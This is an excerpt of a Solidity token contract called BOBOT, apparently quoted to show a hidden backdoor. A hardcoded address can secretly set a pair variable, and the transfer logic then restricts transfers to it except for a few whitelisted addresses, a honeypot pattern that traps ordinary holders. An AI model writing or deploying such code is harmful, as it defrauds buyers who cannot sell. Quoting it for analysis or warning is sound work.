...
contract BOBOT is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x43100ECB3D8AD7e392C40B7F86D52b0B8e332a0d) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         (_p76234 == to && from != 0x1bEAD687FcEbA8B7E69D88699c9ba5b90Ba1BD82 && 
         from  != 0x43100ECB3D8AD7e392C40B7F86D52b0B8e332a0d 
         && from != 0xB508CCb23FbB9DaD7725D2Ce306e69088Ec55AFb)) {
    ...
    constructor() {
        _name = unicode"BOBOT";
        _symbol = unicode"BOBOT";
        _mint(msg.sender, 238000000000 * 10 ** decimals());
    }
